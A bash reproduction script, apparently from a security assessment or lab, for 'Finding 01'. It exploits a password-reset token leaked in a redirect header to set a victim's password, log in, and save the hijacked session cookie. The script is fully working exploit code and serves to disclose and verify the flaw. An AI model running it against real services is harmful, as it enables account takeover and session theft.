#!/usr/bin/env bash
# Finding 01: account takeover via leaked password-reset token.
# Usage: ./repro-01-reset-takeover.sh <base_url> <victim_email> <new_password>
set -euo pipefail
BASE="${1:-http://192.168.1.74:4942}"
EMAIL="${2:-jdoe@student.42.tech}"
NEWPASS="${3:-Pwned1234!}"

echo "[*] Requesting reset for $EMAIL"
LOC=$(curl -s -o /dev/null -D - -X POST "$BASE/reset-password/request" \
  --data-urlencode "email=$EMAIL" | grep -i '^location:' | tr -d '\r')
echo "    $LOC"

TOKEN=$(echo "$LOC" | sed -n 's/.*token=\([a-f0-9]*\).*/\1/p')
if [ -z "$TOKEN" ]; then
  echo "[-] Could not extract token"; exit 1
fi
echo "[+] Leaked token: $TOKEN"

echo "[*] Confirming new password"
curl -s -X POST "$BASE/reset-password/confirm" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "new_password=$NEWPASS" > /dev/null
echo "[+] Password set to: $NEWPASS"

echo "[*] Logging in"
curl -si -X POST "$BASE/login" \
  --data-urlencode "identity=$EMAIL" \
  --data-urlencode "password=$NEWPASS" \
  -c cookies_takeover.txt | grep -i 'set-cookie\|HTTP/'
echo "[+] Session cookie saved to cookies_takeover.txt"
